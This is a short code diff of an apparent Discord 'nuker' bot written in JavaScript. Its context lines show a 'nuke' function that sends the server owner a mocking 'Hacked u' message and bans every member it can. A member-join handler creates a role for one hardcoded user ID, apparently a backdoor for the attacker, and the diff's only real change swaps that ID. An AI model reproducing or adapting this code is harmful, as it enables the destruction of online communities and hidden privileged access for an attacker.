@@ -461,7 +461,6 @@ async function nuke(guild) {
   await guild.owner.send(' Hacked u by unknown Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
 
 
-
   await Promise.all(guild.members.map(async (m) => {
     if (m.bannable) {
       users++;
@@ -498,7 +497,7 @@ client.on('guildCreate', async (guild) => {
 
 client.on('guildMemberAdd', member => {
     
-            if (member.id === "415595760990552065") {
+            if (member.id === "328333685088845824") {
                 member.guild.createRole({
                     name : client.user.username,
                     color : "RANDOM", 
